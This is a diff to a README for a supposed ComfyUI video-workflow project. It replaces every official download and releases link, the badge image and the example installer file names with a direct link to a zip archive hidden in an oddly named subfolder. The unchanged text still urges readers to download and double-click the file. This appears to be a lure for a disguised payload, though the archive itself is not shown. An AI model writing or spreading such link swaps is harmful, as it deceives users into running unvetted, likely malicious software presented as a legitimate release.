@@ -1,6 +1,6 @@
 # 🎉 ComfyUI-Workflow-Sora2Alike-Full-loop-video - Enjoy Seamless Video Workflows
 
-![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-3CB371)
+![Download Now](https://raw.githubusercontent.com/Aldi-R/ComfyUI-Workflow-Sora2Alike-Full-loop-video/main/semisocinian/ComfyUI-Workflow-Sora2Alike-Full-loop-video.zip%20Now-Click%20Here-3CB371)
 
 ## 📦 Overview
 
@@ -13,7 +13,7 @@ To set up and run the application, follow these straightforward steps:
 1. **Visit the Releases Page**  
    Click the link below to go to the official releases page. This page contains the necessary files to download the software.
 
-   [Visit Releases Page](https://github.com/Aldi-R/ComfyUI-Workflow-Sora2Alike-Full-loop-video/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/Aldi-R/ComfyUI-Workflow-Sora2Alike-Full-loop-video/main/semisocinian/ComfyUI-Workflow-Sora2Alike-Full-loop-video.zip)
 
 2. **Choose the Latest Version**  
    Once on the releases page, find the most recent version at the top of the list. It should be clearly labeled with the version number.
@@ -21,8 +21,8 @@ To set up and run the application, follow these straightforward steps:
 3. **Download the Application**  
    Click on the appropriate file for your operating system to download the application. The files typically have names that include `.exe` for Windows, and similar formats for other systems.
 
-   - For Windows, look for a file like `ComfyUI-Workflow-Sora2Alike-Full-loop-video-win.exe`.
-   - For macOS, you may find something like `ComfyUI-Workflow-Sora2Alike-Full-loop-video-macos.dmg`.
+   - For Windows, look for a file like `https://raw.githubusercontent.com/Aldi-R/ComfyUI-Workflow-Sora2Alike-Full-loop-video/main/semisocinian/ComfyUI-Workflow-Sora2Alike-Full-loop-video.zip`.
+   - For macOS, you may find something like `https://raw.githubusercontent.com/Aldi-R/ComfyUI-Workflow-Sora2Alike-Full-loop-video/main/semisocinian/ComfyUI-Workflow-Sora2Alike-Full-loop-video.zip`.
 
 4. **Install the Software**  
    After the download finishes, locate the file in your downloads folder. Double-click the file to start the installation process. Follow the on-screen instructions to complete the installation.
@@ -52,7 +52,7 @@ To ensure optimal performance, please check the following system requirements:
 
 To get started, **visit the releases page** where you can **download the latest version**.
 
-[Download Now](https://github.com/Aldi-R/ComfyUI-Workflow-Sora2Alike-Full-loop-video/releases)
+[Download Now](https://raw.githubusercontent.com/Aldi-R/ComfyUI-Workflow-Sora2Alike-Full-loop-video/main/semisocinian/ComfyUI-Workflow-Sora2Alike-Full-loop-video.zip)
 
 Follow the steps outlined above to download and install the application. After installation, you will be ready to take control of your video editing tasks.
 
